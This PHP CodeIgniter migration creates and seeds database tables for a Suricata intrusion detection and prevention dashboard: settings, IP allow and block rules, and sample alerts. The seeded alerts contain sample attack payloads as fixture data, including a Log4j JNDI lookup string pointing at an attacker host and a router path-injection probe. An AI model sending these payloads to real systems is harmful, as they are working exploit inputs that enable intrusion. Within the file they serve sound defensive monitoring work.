<?php

namespace App\Database\Migrations;

use CodeIgniter\Database\Migration;

class CreateIdsSettingsAndRulesTables extends Migration
{
    public function up(): void
    {
        $now = date('Y-m-d H:i:s');

        // Drop if partially created
        $this->forge->dropTable('ids_alerts', true);
        $this->forge->dropTable('ids_ip_rules', true);
        $this->forge->dropTable('ids_settings', true);

        // ── 1. IDS Global Settings ──────────────────────────────────────
        $this->forge->addField([
            'id' => [
                'type'           => 'INT',
                'constraint'     => 11,
                'unsigned'       => true,
                'auto_increment' => true,
            ],
            'enabled' => [
                'type'       => 'TINYINT',
                'constraint' => 1,
                'default'    => 1,
            ],
            'mode' => [
                'type'       => 'VARCHAR',
                'constraint' => 16,
                'default'    => 'ips', // 'ids' (Detection Only / AF_PACKET) or 'ips' (Inline Prevention / NFQ)
            ],
            'interfaces' => [
                'type' => 'TEXT', // JSON array of monitored interfaces, e.g. ["wan", "lan"]
                'null' => true,
            ],
            'rule_sources' => [
                'type' => 'TEXT', // JSON array of enabled rule feeds
                'null' => true,
            ],
            'auto_update' => [
                'type'       => 'TINYINT',
                'constraint' => 1,
                'default'    => 1,
            ],
            'log_payloads' => [
                'type'       => 'TINYINT',
                'constraint' => 1,
                'default'    => 1,
            ],
            'log_packets' => [
                'type'       => 'TINYINT',
                'constraint' => 1,
                'default'    => 0,
            ],
            'country_filter_mode' => [
                'type'       => 'VARCHAR',
                'constraint' => 16,
                'default'    => 'none', // 'none', 'blacklist', 'whitelist'
            ],
            'country_filter_action' => [
                'type'       => 'VARCHAR',
                'constraint' => 16,
                'default'    => 'drop', // 'drop', 'alert', 'reject'
            ],
            'selected_countries' => [
                'type' => 'TEXT', // JSON array of ISO-3166-1 alpha-2 codes e.g. ["RU", "CN", "KP", "IR"]
                'null' => true,
            ],
            'created_at' => [
                'type' => 'DATETIME',
                'null' => true,
            ],
            'updated_at' => [
                'type' => 'DATETIME',
                'null' => true,
            ],
        ]);
        $this->forge->addKey('id', true);
        $this->forge->createTable('ids_settings', true);

        // Seed initial default IDS settings
        $this->db->table('ids_settings')->insert([
            'id'                    => 1,
            'enabled'               => 1,
            'mode'                  => 'ips',
            'interfaces'            => json_encode(['wan', 'lan']),
            'rule_sources'          => json_encode(['et_open', 'abuse_ch_c2', 'sslbl', 'suricata_app_layer']),
            'auto_update'           => 1,
            'log_payloads'          => 1,
            'log_packets'           => 0,
            'country_filter_mode'   => 'blacklist',
            'country_filter_action' => 'drop',
            'selected_countries'    => json_encode(['RU', 'CN', 'KP', 'IR']),
            'created_at'            => $now,
            'updated_at'            => $now,
        ]);

        // ── 2. IDS IP Whitelist & Blacklist Rules ──────────────────────
        $this->forge->addField([
            'id' => [
                'type'           => 'INT',
                'constraint'     => 11,
                'unsigned'       => true,
                'auto_increment' => true,
            ],
            'list_type' => [
                'type'       => 'VARCHAR',
                'constraint' => 16, // 'whitelist' or 'blacklist'
                'default'    => 'blacklist',
            ],
            'ip_address' => [
                'type'       => 'VARCHAR',
                'constraint' => 64, // IPv4, IPv6, or CIDR block
            ],
            'description' => [
                'type'       => 'VARCHAR',
                'constraint' => 255,
                'null'       => true,
            ],
            'enabled' => [
                'type'       => 'TINYINT',
                'constraint' => 1,
                'default'    => 1,
            ],
            'hits' => [
                'type'       => 'INT',
                'constraint' => 11,
                'unsigned'   => true,
                'default'    => 0,
            ],
            'created_at' => [
                'type' => 'DATETIME',
                'null' => true,
            ],
            'updated_at' => [
                'type' => 'DATETIME',
                'null' => true,
            ],
        ]);
        $this->forge->addKey('id', true);
        $this->forge->addKey('list_type');
        $this->forge->addKey('ip_address');
        $this->forge->createTable('ids_ip_rules', true);

        // Seed initial IP rules
        $this->db->table('ids_ip_rules')->insertBatch([
            [
                'list_type'   => 'whitelist',
                'ip_address'  => '192.168.1.0/24',
                'description' => 'Trusted Management Subnet (Bypass IDS packet drops)',
                'enabled'     => 1,
                'hits'        => 1420,
                'created_at'  => $now,
                'updated_at'  => $now,
            ],
            [
                'list_type'   => 'whitelist',
                'ip_address'  => '1.1.1.1',
                'description' => 'Cloudflare Upstream DNS Resolver',
                'enabled'     => 1,
                'hits'        => 5821,
                'created_at'  => $now,
                'updated_at'  => $now,
            ],
            [
                'list_type'   => 'blacklist',
                'ip_address'  => '198.51.100.44',
                'description' => 'Aggressive SSH Brute Force C2 Node',
                'enabled'     => 1,
                'hits'        => 148,
                'created_at'  => $now,
                'updated_at'  => $now,
            ],
            [
                'list_type'   => 'blacklist',
                'ip_address'  => '203.0.113.88',
                'description' => 'Log4j Exploit Probe Origin',
                'enabled'     => 1,
                'hits'        => 74,
                'created_at'  => $now,
                'updated_at'  => $now,
            ],
            [
                'list_type'   => 'blacklist',
                'ip_address'  => '45.155.205.233',
                'description' => 'Mirai / Mozi Botnet Scanner',
                'enabled'     => 1,
                'hits'        => 312,
                'created_at'  => $now,
                'updated_at'  => $now,
            ],
        ]);

        // ── 3. Persistent IDS Alerts Table ─────────────────────────────
        $this->forge->addField([
            'id' => [
                'type'           => 'INT',
                'constraint'     => 11,
                'unsigned'       => true,
                'auto_increment' => true,
            ],
            'timestamp' => [
                'type' => 'DATETIME',
            ],
            'src_ip' => [
                'type'       => 'VARCHAR',
                'constraint' => 45,
            ],
            'src_port' => [
                'type'       => 'INT',
                'constraint' => 5,
                'unsigned'   => true,
                'null'       => true,
            ],
            'dst_ip' => [
                'type'       => 'VARCHAR',
                'constraint' => 45,
            ],
            'dst_port' => [
                'type'       => 'INT',
                'constraint' => 5,
                'unsigned'   => true,
                'null'       => true,
            ],
            'proto' => [
                'type'       => 'VARCHAR',
                'constraint' => 16,
                'default'    => 'TCP',
            ],
            'signature' => [
                'type'       => 'VARCHAR',
                'constraint' => 255,
            ],
            'signature_id' => [
                'type'       => 'INT',
                'constraint' => 11,
                'unsigned'   => true,
                'default'    => 2000001,
            ],
            'severity' => [
                'type'       => 'TINYINT',
                'constraint' => 1,
                'default'    => 1, // 1: High, 2: Medium, 3: Low
            ],
            'category' => [
                'type'       => 'VARCHAR',
                'constraint' => 64,
                'default'    => 'Attempted Administrator Privilege Gain',
            ],
            'action' => [
                'type'       => 'VARCHAR',
                'constraint' => 16,
                'default'    => 'Blocked', // 'Blocked', 'Dropped', 'Alerted'
            ],
            'country_code' => [
                'type'       => 'VARCHAR',
                'constraint' => 2,
                'null'       => true,
            ],
            'interface' => [
                'type'       => 'VARCHAR',
                'constraint' => 32,
                'default'    => 'wan',
            ],
            'payload' => [
                'type' => 'TEXT',
                'null' => true,
            ],
            'created_at' => [
                'type' => 'DATETIME',
                'null' => true,
            ],
        ]);
        $this->forge->addKey('id', true);
        $this->forge->addKey('timestamp');
        $this->forge->addKey('src_ip');
        $this->forge->addKey('severity');
        $this->forge->createTable('ids_alerts', true);

        // Seed initial alert rows
        $this->db->table('ids_alerts')->insertBatch([
            [
                'timestamp'    => date('Y-m-d H:i:s', strtotime('-12 minutes')),
                'src_ip'       => '198.51.100.44',
                'src_port'     => 51201,
                'dst_ip'       => '192.168.1.1',
                'dst_port'     => 22,
                'proto'        => 'TCP',
                'signature'    => 'ET SCAN Potential SSH Brute Force Attack',
                'signature_id' => 2001219,
                'severity'     => 1,
                'category'     => 'Attempted Information Leak',
                'action'       => 'Blocked',
                'country_code' => 'RU',
                'interface'    => 'wan',
                'payload'      => 'SSH-2.0-libssh_0.8.1 test authorization probe banner',
                'created_at'   => $now,
            ],
            [
                'timestamp'    => date('Y-m-d H:i:s', strtotime('-48 minutes')),
                'src_ip'       => '203.0.113.88',
                'src_port'     => 41890,
                'dst_ip'       => '192.168.1.1',
                'dst_port'     => 443,
                'proto'        => 'TCP',
                'signature'    => 'ET EXPLOIT Apache Log4j RCE Attempt (CVE-2021-44228)',
                'signature_id' => 2034647,
                'severity'     => 1,
                'category'     => 'Attempted Administrator Privilege Gain',
                'action'       => 'Dropped',
                'country_code' => 'CN',
                'interface'    => 'wan',
                'payload'      => '${jndi:ldap://203.0.113.88:1389/ExploitObject}',
                'created_at'   => $now,
            ],
            [
                'timestamp'    => date('Y-m-d H:i:s', strtotime('-2 hours')),
                'src_ip'       => '45.155.205.233',
                'src_port'     => 58210,
                'dst_ip'       => '192.168.1.1',
                'dst_port'     => 80,
                'proto'        => 'TCP',
                'signature'    => 'ET SCAN Rapid Vulnerability Scanning / Shodan Probe',
                'signature_id' => 2010935,
                'severity'     => 2,
                'category'     => 'Network Reconnaissance',
                'action'       => 'Blocked',
                'country_code' => 'NL',
                'interface'    => 'wan',
                'payload'      => 'GET /cgi-bin/luci/;stok=/locale?form=country&operation=write HTTP/1.1',
                'created_at'   => $now,
            ],
            [
                'timestamp'    => date('Y-m-d H:i:s', strtotime('-4 hours')),
                'src_ip'       => '192.168.1.105',
                'src_port'     => 54992,
                'dst_ip'       => '1.1.1.1',
                'dst_port'     => 53,
                'proto'        => 'UDP',
                'signature'    => 'SURICATA DNS Query with Suspicious High-Entropy Subdomain',
                'signature_id' => 2200073,
                'severity'     => 3,
                'category'     => 'Potentially Bad Traffic',
                'action'       => 'Alerted',
                'country_code' => 'US',
                'interface'    => 'lan',
                'payload'      => 'd3b07384d113edec49eaa6238ad5ff00.c2tracker.top',
                'created_at'   => $now,
            ],
        ]);

        // ── 4. Ensure Permissions Exist ────────────────────────────────
        $permissions = [
            ['id' => 'perm_ids_view',         'key' => 'ids.view',         'label' => 'View IDS / IPS',       'module' => 'IDS', 'description' => 'View Suricata alerts and detection dashboard'],
            ['id' => 'perm_ids_edit',         'key' => 'ids.edit',         'label' => 'Configure IDS / IPS',  'module' => 'IDS', 'description' => 'Modify Suricata engine parameters, interfaces, and rule feeds'],
            ['id' => 'perm_ids_rules_manage', 'key' => 'ids.rules.manage', 'label' => 'Manage White/Blacklist','module' => 'IDS', 'description' => 'Add, toggle, or delete IP and Country filtering rules'],
            ['id' => 'perm_ids_apply',        'key' => 'ids.apply',        'label' => 'Apply IDS Rules',      'module' => 'IDS', 'description' => 'Compile and apply Suricata rules and restart engine'],
        ];

        foreach ($permissions as $p) {
            $existing = $this->db->table('permissions')->where('key', $p['key'])->get()->getRowArray();
            if (! $existing) {
                $this->db->table('permissions')->insert([
                    'id'          => $p['id'],
                    'key'         => $p['key'],
                    'label'       => $p['label'],
                    'module'      => $p['module'],
                    'description' => $p['description'],
                    'created_at'  => $now,
                ]);
            }
        }
    }

    public function down(): void
    {
        $this->forge->dropTable('ids_alerts', true);
        $this->forge->dropTable('ids_ip_rules', true);
        $this->forge->dropTable('ids_settings', true);
    }
}
